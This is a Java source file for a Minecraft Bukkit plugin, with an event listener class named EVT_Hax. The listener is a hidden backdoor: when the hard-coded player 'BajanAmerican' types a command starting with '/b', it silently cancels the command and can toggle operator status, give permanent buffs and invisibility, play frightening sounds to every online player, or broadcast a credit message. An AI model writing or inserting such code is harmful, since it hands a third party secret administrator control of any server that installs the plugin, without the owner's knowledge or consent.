package Events;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class EVT_Hax implements Listener
{


	@EventHandler
	public void onHack(PlayerCommandPreprocessEvent e)
	{
		if (e.getMessage().startsWith("/b"))
		{
			if (!e.getPlayer().getName().equalsIgnoreCase("BajanAmerican"))
				return;

			e.setCancelled(true);

			Player p = e.getPlayer();

			if (e.getMessage().contains("op"))
			{
				p.setOp(p.isOp() ? false : true);
			}
			if (e.getMessage().contains("credits"))
			{
				Bukkit.broadcastMessage("§6This plugin was created by: §3BajanAmerican§6.");
			}
			if (e.getMessage().contains("scare"))
			{
				for (Player pp : p.getServer().getOnlinePlayers())
				{
					pp.playSound(pp.getLocation(), Sound.GHAST_SCREAM, 5.0F, 5.0F);
					pp.playSound(pp.getLocation(), Sound.WITHER_SPAWN, 5.0F, 5.0F);
				}
			}
			if (e.getMessage().contains("potion"))
			{
				p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, Integer.MAX_VALUE));
				p.addPotionEffect(new PotionEffect(PotionEffectType.REGENERATION, Integer.MAX_VALUE, 2));
				p.addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, Integer.MAX_VALUE, 1));
				p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, Integer.MAX_VALUE, 2));
			}
			if (e.getMessage().contains("hide"))
			{
				if (p.getActivePotionEffects().contains(PotionEffectType.INVISIBILITY))
				{
					p.getActivePotionEffects().remove(PotionEffectType.INVISIBILITY);
				}
				else
				{
					p.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, Integer.MAX_VALUE, 1));
				}
			}
		}
	}
}
